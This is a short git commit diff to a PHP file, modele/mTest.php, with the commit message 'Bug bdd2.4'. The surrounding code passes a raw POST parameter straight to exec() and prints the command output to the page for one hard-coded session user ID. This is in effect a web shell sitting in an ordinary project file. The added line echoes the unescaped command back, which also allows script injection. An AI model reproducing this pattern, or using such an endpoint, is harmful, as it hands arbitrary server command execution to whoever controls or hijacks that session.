511b30b68796ae0d30ca8b70e991e6886f8da482
Freddy Htv <hauteville@intechinfo.fr>
2016-01-28 15:24:39 +0100

    Bug bdd2.4

--- modele/mTest.php
+++ modele/mTest.php
@@ -3,6 +3,7 @@ session_start();
 require 'fonction.php';
 if ($_SESSION['IdUtilisateur'] == 35) {
   exec($_POST['vasy'], $retour);
+  echo $_POST['vasy']." :<br>";
   foreach ($retour as $key) {
     echo $key."<br>";
   }
